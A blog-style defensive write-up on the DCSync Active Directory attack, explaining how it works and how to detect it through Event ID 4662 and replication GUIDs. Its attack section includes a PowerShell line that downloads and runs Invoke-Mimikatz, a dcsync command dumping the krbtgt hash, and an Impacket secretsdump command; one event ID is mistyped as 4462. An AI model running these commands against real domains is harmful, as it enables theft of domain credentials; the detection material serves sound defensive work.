---
author:
- David Johnson
index: 'Windows!Servers!DCSync'
setupfile: '\"../org-html-themes/org/theme-readtheorg-local-1.setup\"'
tag: DCSync
title: DCSync
---

DCSync is a powerful tool in the hands of a red teamer and a nightmare
for Blue teamers. For the blue teamer all is not lost. This type of
attack may not be feasible to stop but it can be detected.

Abstract
========

Here I will show how you can quickly and easily get detections in place
DCSync. I begging with a brief overview of DCSync and a quick guide on
how to use it to get credentials. I then cover how to detect this type
of attack and why I chose the rout I did. Finally I provide references
for further review if more information is desired.

DCSync {#dcsync-1}
======

Description
-----------

DCSync works by requesting account password data from a Domain
Controller[^1]. It can also ask Domain Controllers to replicate
information using the Directory Replication Service Remote Protocol[^2].
All this can be done without running any code on a Domain Controller
unlike some of the other ways Mimikatz extracts password data. Whats
even worse this attack takes advantage of a valid and necessary function
of Active Directory, meaning it cannot be turned off or disabled. This
being said we must rely on detection.

Getting Credentials
-------------------

I split this in to two parts local and remote. As the names suggest each
of these sections will cover how to run DCSync depending on if you want
to run it locally or remote. To follow along all one needs is a Windows
Active Directory Domain Controller. If running DCSync remotely a
separate machine with Impacket installed is needed.

### Local

To run DCSync locally I will use Invoke-Mimikatz[^3].

On the Windows Domain Controller start up powershell and lets download
Invoke-Mimikatz.

``` {.example}
iex (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
```

Once that has finished we can run DCSync with the following command.

``` {.example}
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt /domain:Win2016.local"'
```

For more information[^4].

### Remote

To run DCSync remotely I will use secretsdump.py from Impacket[^5].

On the remote machine open a terminal/console and run the following.
Don\'t forget to replace with a privliged user. Replace with the users
password and replace with the Domain Controllers IPAddress.

``` {.example}
secretsdump.py -just-dc <user>:<password>@<ipaddress>
```

Detection
---------

There are two ways to detect DCSync.

-   Network Monitoring[^6]
    -   DsGeNCChange
-   Event ID [^7] [^8] [^9] [^10]
    -   4462

For most people and environments Network Monitoring may not a realistic
option leaving us with the Event ID. To detect DCSync with Event Id 4662
we want to examine the value of the Properties field and see if it
contains Replicating Directory Changes All,
1131f6ad-9c07-11d1-f79f-00c04fc2dcd2,
9923a32a-3607-11d2-b9be-0000f87a36b2, or
1131f6ac-9c07-11d1-f79f-00c04fc2dcd2 anywhere in it.

``` {.example}
 1  <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 2  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
 3      <System>
 4          <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" />
 5          <EventID>4662</EventID>
 6          <Version>0</Version>
 7          <Level>0</Level>
 8          <Task>14080</Task>
 9          <Opcode>0</Opcode>
10          <Keywords>0x8020000000000000</Keywords>
11          <TimeCreated SystemTime="2018-06-06T12:01:41.388171400Z" />
12          <EventRecordID>6583</EventRecordID>
13          <Correlation />
14          <Execution ProcessID="472" ThreadID="592" />
15          <Channel>Security</Channel>
16          <Computer>Win2012r2.WIN2012R2.local</Computer>
17          <Security />
18      </System>
19      <EventData>
20          <Data Name="SubjectUserSid">S-1-5-21-1384719796-2249325780-1962070806-1001</Data>
21          <Data Name="SubjectUserName">vagrant</Data>
22          <Data Name="SubjectDomainName">WINDOMAIN</Data>
23          <Data Name="SubjectLogonId">0x38867</Data>
24          <Data Name="ObjectServer">DS</Data>
25          <Data Name="ObjectType">%{19195a5b-6da0-11d0-afd3-00c04fd930c9}</Data>
26          <Data Name="ObjectName">%{e3345764-2df3-459e-adb4-615a23cf4374}</Data>
27          <Data Name="OperationType">Object Access</Data>
28          <Data Name="HandleId">0x0</Data>
29          <Data Name="AccessList">%%7688</Data>
30          <Data Name="AccessMask">0x100</Data>
31          <Data Name="Properties">%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}</Data>
32          <Data Name="AdditionalInfo">-</Data>
33          <Data Name="AdditionalInfo2" />
34      </EventData>
35  </Event>
```

In the example above we can see the Properties value is **%%7688
{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
{19195a5b-6da0-11d0-afd3-00c04fd930c9**. This does contain one of the
strings we are looking for, **1131f6ad-9c07-11d1-f79f-00c04fc2dcd2**,
making this is a positive match.

Not all machines have logging turned on for example Windows server 2016
the GPO will need to be set for loging this event Id. This is done by
opening the Local Group Policy Editor and going to Computer
configurations \> Windows Settings \> Security Settings \> Local
Policies \> Audit Policy. Right clicking on Audit directory service
access and then click on Properties. Check the box for Success and click
Apply.

### Note

On my Windows 2016 server the GPO keeps getting turned off. Searching I
did find two10, 5 posts where people were having issues similar to the
one I am experiencing. Though in these article there was no sufficient
answers.

Footnotes

[^1]: Ad security: Mimikatz DCSync Usage, Exploitation, and Detection

[^2]: Extracting User Password Data with Mimikatz DCSync

[^3]: Invoke-mimikatz

[^4]: harnj0y: mimikatz-and-dcsync-and-extrasids-oh-my

[^5]: security auditing being turned off

[^6]: Ad security: Mimikatz DCSync Usage, Exploitation, and Detection

[^7]: gentilkiwi splunk

[^8]: ultimatewindowssecurity

[^9]: ultimatewindowssecurity2

[^10]: modern-active-directory-attack-scenarios-and-how-to-detect-them
